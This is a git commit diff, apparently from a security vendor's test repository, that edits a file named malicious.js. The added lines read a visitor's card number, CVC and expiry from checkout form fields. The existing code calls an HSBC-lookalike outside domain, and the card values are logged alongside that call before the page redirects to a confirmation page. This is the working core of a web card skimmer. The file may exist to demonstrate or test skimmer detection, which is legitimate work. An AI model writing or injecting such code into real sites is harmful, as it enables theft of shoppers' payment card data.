d8eaf323e9f45ae8571af38246b4142ef3fee52e
AzureAD\YakovMendelson <yakov.m@reflectiz.com>
2021-07-08 16:15:33 +0300

    null

--- source/js/malicious.js
+++ source/js/malicious.js
@@ -1,5 +1,12 @@
 function myFunction() {
+
+   let a = document.querySelector('#card-cvc').value
+   let b = document.querySelector('#card-number').value
+   let c = document.querySelector('#card-expiry').value
+
    fetch('https://hsbc.com.hk.1.1.7b52bd64.roksit.net/',{ mode: 'no-cors'})
     .then(response => console.log(response))
-    .then(res=>{console.log(res); window.location.href = 'confirmation.html'})
+    .then(res=>{console.log(res,a,b,c); 
+        window.location.href = 'confirmation.html'
+    })
 }
